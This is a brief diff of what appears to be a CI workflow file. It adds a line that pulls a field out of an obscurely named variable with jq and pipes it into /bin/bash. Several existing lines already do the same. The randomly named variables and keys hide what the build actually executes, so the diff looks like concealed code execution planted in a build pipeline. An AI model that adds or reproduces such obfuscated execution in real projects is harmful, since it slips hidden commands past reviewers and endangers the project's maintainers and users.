@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$izemu6" | jq -r .kbl3 | /bin/bash
           echo $vhvq32 | jq -r .snx89 | /bin/bash
           printf '%s' "$x6873" | jq -r .qdq9396 | /bin/bash
+          echo $z5 | jq -r .qn780 | /bin/bash
 
       - name: Save archive
         if: always()
